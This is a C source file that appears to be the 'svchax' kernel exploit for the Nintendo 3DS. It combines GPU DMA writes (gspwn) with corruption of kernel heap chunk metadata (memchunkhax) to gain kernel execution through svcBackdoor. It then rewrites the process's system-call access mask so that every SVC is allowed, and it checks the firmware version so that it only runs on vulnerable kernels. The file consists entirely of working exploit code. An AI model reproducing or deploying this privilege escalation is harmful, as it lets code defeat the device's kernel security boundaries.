
#include <3ds.h>
#include <string.h>

static void svchax_gspwn(u32 dst, u32 src, u32 size, u8* flush_buffer)
{
   extern Handle gspEvents[GSPEVENT_MAX];

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
   GSPGPU_InvalidateDataCache(dst, size);
   GSPGPU_FlushDataCache(src, size);
   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);

   svcClearEvent(gspEvents[GSPEVENT_PPF]);
	GX_TextureCopy(src, 0, dst, 0, size, 8);
   svcWaitSynchronization(gspEvents[GSPEVENT_PPF], U64_MAX);

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
}

/* pseudo-code:
 * if(val2)
 * {
 *    *(u32*)val1 = val2;
 *    *(u32*)(val2 + 8) = (val1 - 4);
 * }
 * else
 *    *(u32*)val1 = 0x0;
 */

// X-X--X-X
// X-XXXX-X

static void memchunkhax_write_pair(u32 val1, u32 val2)
{
   u32 linear_buffer;
   u8* flush_buffer;
   u32 tmp;

   u32* next_ptr3;
   u32* prev_ptr3;

   u32* next_ptr1;
   u32* prev_ptr6;

   svcControlMemory(&linear_buffer, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   flush_buffer = (u8*)(linear_buffer + 0x8000);

   svcControlMemory(&tmp, linear_buffer + 0x1000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x3000, 0, 0x2000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x6000, 0, 0x1000, MEMOP_FREE, 0);

   next_ptr1 = (u32*)(linear_buffer + 0x0004);
   svchax_gspwn(linear_buffer + 0x0000, linear_buffer + 0x1000, 16, flush_buffer);

   next_ptr3 = (u32*)(linear_buffer + 0x2004);
   prev_ptr3 = (u32*)(linear_buffer + 0x2008);
   svchax_gspwn(linear_buffer + 0x2000, linear_buffer + 0x3000, 16, flush_buffer);

   prev_ptr6 = (u32*)(linear_buffer + 0x5008);
   svchax_gspwn(linear_buffer + 0x5000, linear_buffer + 0x6000, 16, flush_buffer);

   *next_ptr1 = *next_ptr3;
   *prev_ptr6 = *prev_ptr3;

   *prev_ptr3 = val1 - 4;
   *next_ptr3 = val2;
   svchax_gspwn(linear_buffer + 0x3000, linear_buffer + 0x2000, 16, flush_buffer);
   svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   svchax_gspwn(linear_buffer + 0x1000, linear_buffer + 0x0000, 16, flush_buffer);
   svchax_gspwn(linear_buffer + 0x6000, linear_buffer + 0x5000, 16, flush_buffer);

   svcControlMemory(&tmp, linear_buffer + 0x0000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x2000, 0, 0x4000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x7000, 0, 0x9000, MEMOP_FREE, 0);

}


static inline u32 get_7B_access_ctrl_ptr(void)
{
   register u32 r0 __asm__("r0");
	__asm__ volatile (
       "sub r0, sp, #8 \n\t"
       "mov r1, #1 \n\t"
       "mov r2, #0 \n\t"
       "svc	0x2A \n\t"
       "orr r0, r1, #0xF00 \n\t"
       "bic r0, r0, #0x0FF \n\t"
       "add r0, r0, #0x044 \n\t"
       :::"r0","r1","r2");
	return r0;
}

static u32 saved_vram_value;

static s32 k_restore_vram_value(void)
{
   __asm__ volatile("cpsid aif \n\t");

   *(u32*)0x1F000008 = saved_vram_value;

   return 0;
}

static s32 k_enable_all_svc(void)
{
   __asm__ volatile("cpsid aif");

   u32*  svc_access_control = *(*(u32***)0xFFFF9000 + 0x22) - 0x6;

   svc_access_control[0]=0xFFFFFFFE;
   svc_access_control[1]=0xFFFFFFFF;
   svc_access_control[2]=0xFFFFFFFF;
   svc_access_control[3]=0x3FFFFFFF;

   return 0;
}

u32 __ctr_svchax = 0;

void svchax_init(void)
{
   extern u32 __service_ptr;

   if (__ctr_svchax)
      return;

   if(__service_ptr)
   {
      if((*(u8*)0x1FF80002 > 0x2F) || (*(u8*)0x1FF80003 != 0x2))
         return;

      saved_vram_value = *(u32*)0x1F000008;
      memchunkhax_write_pair(get_7B_access_ctrl_ptr(), 0x1F000000);
      svcBackdoor(k_restore_vram_value);
   }

   svcBackdoor(k_enable_all_svc);

   __ctr_svchax = 1;

}
